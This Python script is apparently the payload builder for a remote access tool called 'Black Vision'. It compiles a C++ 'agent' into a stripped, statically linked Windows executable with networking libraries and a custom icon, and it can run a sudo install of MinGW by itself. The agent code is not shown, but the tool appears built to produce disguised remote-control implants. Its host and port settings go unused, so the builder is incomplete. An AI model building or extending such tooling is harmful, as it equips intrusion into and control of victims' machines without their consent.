import os
import colorama
from shutil import which
from tkinter import *
from tkinter import messagebox

colorama.init()
def banner():
    banner_one =  colorama.Fore.LIGHTGREEN_EX + r"""
    Black Vision Remote Access                   
    """ + colorama.Style.RESET_ALL

    return banner_one

def clear():
    if(os.name == "nt"):
        os.system("cls")
    else:
        os.system("clear")

def exeCheck(path):
    print("[~] Checking if "+str(path)+" is installed.")
    p = which(path)
    if(p):
        print("[+] Found " + str(p))
        return True
    else :
        print("[-] Not Installed.")
        return False


def rc_generate(filename, iconpath):
    with open(filename+".rc", "w+") as rcfile:
        rcfile.write('id ICON "'+iconpath+'"')
    if(os.name == "nt"):
        if(exeCheck("windres") == True):
            winrescmd = "windres "+filename+".rc" +" -O coff -o "+filename+".res"
            os.system(winrescmd)
        else:
            print("Mingw is not properly installed or NOT availabe in PATH.")
            print("[-] Please install Mingw Compiler (http://www.mingw.org/)")
            showError("Built Failed!\nMingw is not properly installed or NOT availabe in PATH.\nPlease install Mingw Compiler (http://www.mingw.org/)")



def generate(host, port, filename):

    if(os.name == "nt"):
        if(exeCheck("g++") == True):
            print("[+] Generating Executable..")
            # First Change Host and Port then continue
            wincmd = "g++ agent/main.cpp agent/blackvision.cpp -MD -s -o "+filename+" -lws2_32 -lwininet -static " +filename+".res"
            os.system(wincmd)
            print("[+] File Compiled..")
            showInfo("Build succeeded!")
        else :
            print("[-] Please install Mingw Compiler (http://www.mingw.org/)")
            showError("Please install Mingw Compiler (http://www.mingw.org/)")
    else:
        if(exeCheck("i686-w64-mingw32-g++") == True):
            print("[+] Generating Executable..")
            cmd = "i686-w64-mingw32-g++ agent/main.cpp agent/blackvision.cpp -MD -s -o "+filename+" -lws2_32 -lwininet -static " +filename+".res"
            os.system(cmd)
            print("[+] File Compiled..")
            showInfo("Build succeeded!")

        else:
            print("[+] Attempting to Install mingw..")
            showInfo("Mingw not installed, Installing...")
            os.system("sudo apt-get install mingw-w64")



def showError(errormessage):
    """ Show an Error MessageBox """
    messagebox.showerror("BlackVision", errormessage)

def showInfo(infomessage):
    """ Show an Information MessageBox """
    messagebox.showinfo("BlackVision", infomessage)

def showWarning(warning):
    """ Show an Information MessageBox """
    messagebox.showwarning("BlackVision", warning)



